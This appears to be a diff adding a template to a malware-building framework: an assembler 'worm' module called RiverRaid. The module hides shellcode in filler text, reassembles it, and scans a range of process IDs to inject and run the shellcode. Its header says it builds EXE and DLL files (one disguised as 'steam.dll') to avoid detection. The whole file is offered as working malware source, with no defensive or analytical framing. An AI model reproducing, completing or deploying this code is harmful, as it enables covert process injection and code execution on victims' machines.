@@ -1,0 +1,135 @@
+#!name##RiverRaid
+#!types##worm
+#!info##Assembler worm [W]. Hides shellcode in multiple text variables. Checks each PID in the specified range trying to inject shellcode into the process and run. Creates an EXE and DLL file with the injection function to avoid detection.
+#!globalVar##COMPILER_NO_DLL##Not include DLLs
+#!banned##module##starter##shadow##junk
+#!processWorm##ExeLib
+#!lang##asm
+#!system_FLAG##[W]
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!reqVar##RR_scode##Shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
+#!reqFood##FOOD_text##FOOD_random_text##Text to fill code
+#!reqVar##RR_start_pid##PID number from which the attack will start.##int
+#!reqVar##RR_stop_pid##PID number to which the attack will be stoped.##int
+#!setVar##RR_start_pid##800##int
+#!setVar##RR_stop_pid##10000##int
+#!options##DLLS_src_temp_dll##DLL_Injector
+#!reqVar##DLL_file_name##Name of DLL file and library that will be created.##str
+#!setVar##DLL_file_name##steam.dll##str
+#!setVar##DLL_src_temp_dll##DLL_Injector##str
+
+
+extern _ExitProcess@4
+extern _printf
+extern _Scanner
+
+
+section .data
+    text_exit: db "Exit Program", 10, 0
+    text_build_end: db "Build code end", 10, 0
+    text_sc_end: db "Scan Complete", 10, 0
+
+    {{TOOL.build_asm_scvar(FOOD_text, RR_scode, "var", "my_data")}}
+    var_limit: equ {{TOOL.shellcode_len(RR_scode)}}
+    min_age: equ {{RR_start_pid}}
+    max_age: equ {{RR_stop_pid}}
+    
+    
+section .bss
+    scdata resb 2048
+    sindex resd 1
+    tindex resd 1
+    pindex resd 1
+
+section .text
+    global _main
+
+_main:
+    call Builder
+    call Scout
+    call _Scanner
+    call Exit
+
+Scout:
+    xor ecx, ecx
+    mov ecx, min_age
+    mov [pindex], ecx
+    Scout_loop:
+        mov ecx, [pindex]
+        cmp ecx, max_age
+        je Scout_end
+        mov edx, scdata
+        mov ebx, var_limit
+        call _Scanner
+        cmp eax, 1
+        je Scout_end
+        mov ecx, [pindex]
+        inc ecx
+        mov [pindex], ecx
+        jmp Scout_loop
+    
+    Scout_end:
+        push text_sc_end
+        call _printf
+        add esp, 4
+    
+    ret
+    
+    
+
+Builder:
+    xor eax, eax
+    mov [sindex], eax
+    mov [tindex], eax
+    _Builder_loop:
+        mov ecx, [tindex]
+        cmp ecx, var_limit
+        je _Builder_end
+        call _Check_text
+        mov ecx, [tindex]
+        inc ecx
+        mov [tindex], ecx
+        jmp _Builder_loop
+        
+        
+        
+    _Builder_end:
+        push text_build_end
+        call _printf
+        add esp, 4
+        
+    ret
+
+; IN: ecx - table index
+_Check_text:
+    xor ebx, ebx
+    mov ebx, [my_data + 4 * ecx]
+    xor ecx, ecx    ; index = 0
+    xor eax, eax
+    _Check_text_loop:
+        mov al, [ebx + ecx]
+        cmp al, 10
+        je _Check_text_end
+        inc ecx
+        jmp _Check_text_loop
+    
+    _Check_text_end:
+        inc ecx
+        mov al, [ebx + ecx]
+        xor edx, edx
+        mov edx, [sindex]
+        mov [scdata + edx], al  ; put byte in sc_data
+        inc edx     ; shellcode index + 1
+        mov [sindex], edx   ; save new index
+    ret
+    
+        
+        
+
+Exit:
+    push text_exit
+    call _printf
+    add esp, 4
+    push 0
+    call _ExitProcess@4
